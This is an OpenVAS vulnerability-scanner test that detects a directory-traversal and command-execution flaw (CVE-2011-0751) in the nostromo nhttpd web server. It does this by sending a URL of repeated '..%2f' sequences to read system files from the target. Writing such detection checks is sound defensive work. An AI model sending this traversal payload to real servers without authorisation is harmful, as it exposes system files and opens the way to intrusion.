###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_nhttpd_46880.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# nostromo nhttpd Directory Traversal Remote Command Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "nostromo nhttpd is prone to a remote command-execution vulnerability
because it fails to properly validate user-supplied data.

An attacker can exploit this issue to access arbitrary files and
execute arbitrary commands with application-level privileges.

nostromo versions prior to 1.9.4 are affected.";

tag_solution = "Updates are available. Please see the references for details.";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103119");
 script_version("$Revision: 9351 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2011-03-21 13:19:58 +0100 (Mon, 21 Mar 2011)");
 script_bugtraq_id(46880);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2011-0751");

 script_name("nostromo nhttpd Directory Traversal Remote Command Execution Vulnerability");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/46880");
 script_xref(name : "URL" , value : "http://www.nazgul.ch/dev_nostromo.html");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/517026");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
 script_mandatory_keys("nostromo/banner");
 script_require_ports("Services/www", 80);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);
if("Server: nostromo" >!< banner)exit(0);

files = traversal_files();
   
foreach file (keys(files)) {
  url = string("/",crap(data:"..%2f",length:10*5),files[file]); 

  if(http_vuln_check(port:port, url:url,pattern:file)) {
     
    security_message(port:port);
    exit(0);

  }
}

exit(0);

